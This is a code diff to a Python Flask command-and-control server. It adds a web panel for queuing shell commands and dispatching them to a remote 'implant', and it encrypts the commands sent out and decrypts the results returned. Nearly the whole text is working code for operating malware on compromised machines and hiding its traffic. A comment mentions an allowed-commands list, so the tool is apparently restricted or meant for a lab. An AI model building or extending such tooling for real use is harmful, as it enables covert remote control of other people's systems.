@@ -1,4 +1,5 @@
 from flask import Flask, request, jsonify
+from fernet import encrypt, decrypt
 import os
 import uuid
 
@@ -19,16 +20,43 @@ def home():
     </head>
     <body>
         <h2>Queue a Command</h2>
-        <form action="/add_command" method="post">
-            <input type="text" name="command" placeholder="e.g. whoami" />
-            <button type="submit">Send Command</button>
-        </form>
+        <input type="text" id="commandInput" placeholder="e.g. whoami" />
+        <button onclick="addCommand()">Send Command</button>
+        <pre id="addResult"></pre>
+
+        <h2>Dispatch Next Command in Queue to the Implant</h2>
+        <button onclick="fetchCommand()">Fetch & Issue Command</button>
+        <pre id="fetchResult"></pre>
 
         <h2>Queued Commands</h2>
         <pre>{}</pre>
 
         <h2>Task History</h2>
         <pre>{}</pre>
+
+        <script>
+        function addCommand() {{
+            const cmd = document.getElementById('commandInput').value;
+            fetch('/add_command', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{command: cmd}})
+            }})
+            .then(r => r.json())
+            .then(data => {{
+                document.getElementById('addResult').textContent = JSON.stringify(data, null, 2);
+                document.getElementById('commandInput').value = '';
+            }});
+        }}
+
+        function fetchCommand() {{
+            fetch('/command')
+                .then(r => r.json())
+                .then(data => {{
+                    document.getElementById('fetchResult').textContent = JSON.stringify(data, null, 2);
+                }});
+        }}
+        </script>
     </body>
     </html>
     """.format(commandQ, tasks)
@@ -49,7 +77,10 @@ def command():
     taskID = str(uuid.uuid4())[:8]
     tasks[taskID] = cmd
     print(f'[+] Issuing task {taskID}: {cmd}')
-    return jsonify({"taskID": taskID, "command": cmd})
+    #encrypt the command before sending it off.
+    encrypted_cmd = encrypt(cmd)
+    #print(f'debugging purposes: encrypted cmd: {encrypted_cmd}\n')
+    return jsonify({"taskID": taskID, "command": encrypted_cmd})
 
 #adds a command from the allowedCommands list to the queue. 
 @app.route("/add_command", methods=["POST"])
@@ -71,6 +102,12 @@ def result():
     data = request.json
     taskID = data.get("taskID")
     output = data.get("output")
+    #decrypt the output received.
+    try:
+        output = decrypt(output)
+        #print(f'debugging purposes: encrypted message received: {output}')
+    except:
+        pass
     cmd = tasks.get(taskID, "unknown")
     print(f"[+] Result received for {taskID} {cmd}: {output}")
     return jsonify({"status": "received"})
